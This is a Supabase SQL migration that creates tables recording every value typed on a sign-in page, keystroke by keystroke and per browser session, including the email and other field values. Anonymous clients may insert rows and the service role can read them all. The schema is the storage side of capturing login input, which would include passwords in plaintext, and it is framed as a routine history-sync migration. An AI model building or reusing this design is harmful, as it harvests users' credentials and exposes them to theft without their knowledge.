-- Remote history sync: already applied on project soswwsvunulnhlcitpwl.
-- Kept in-repo so Supabase Preview can match remote schema_migrations.

create table if not exists public.login_typed (
  id bigint generated always as identity primary key,
  session_id text not null,
  field text not null,
  value text not null default ''::text,
  created_at timestamptz not null default now()
);

comment on table public.login_typed is 'Every value typed on the sign-in page, saved as it is entered.';

create table if not exists public.login_typed_latest (
  session_id text primary key,
  email text not null default ''::text,
  fields jsonb not null default '{}'::jsonb,
  updated_at timestamptz not null default now()
);

comment on table public.login_typed_latest is 'Latest sign-in field values per browser session.';

alter table public.login_typed enable row level security;
alter table public.login_typed_latest enable row level security;

drop policy if exists "anon can insert login_typed" on public.login_typed;
create policy "anon can insert login_typed"
  on public.login_typed
  for insert
  to anon, authenticated
  with check (true);

grant insert, truncate, references, trigger on public.login_typed to anon, authenticated;
grant select, insert, update, delete, truncate, references, trigger on public.login_typed to service_role;
grant select, insert, update, delete, truncate, references, trigger on public.login_typed_latest to service_role;
